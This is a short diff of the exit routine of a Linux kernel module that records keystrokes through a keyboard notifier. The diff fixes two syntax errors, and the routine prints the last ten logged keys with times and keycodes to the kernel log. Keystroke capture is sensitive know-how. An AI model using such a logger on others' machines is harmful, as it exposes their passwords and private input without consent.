@@ -153,10 +153,10 @@ static void __exit dni_exit(void)
 
 	misc_deregister(&device);
 	unregister_keyboard_notifier(&keyboard_nb);
-	fist_for_each_entry(cursor, &keystroke_list, list)
+	list_for_each_entry(cursor, &keystroke_list, list)
 		total++;
 	list_for_each_entry(cursor, &keystroke_list, list) {
-		if (total - count <= 10 {
+		if (total - count <= 10 ) {
 			pr_info("%02d:%02d:%02d %s (%llu), ascii : \'%c\', %s\n",
 				cursor->tm.tm_hour, cursor->tm.tm_min, cursor->tm.tm_sec,
 				cursor->key.name, cursor->key.keycode,
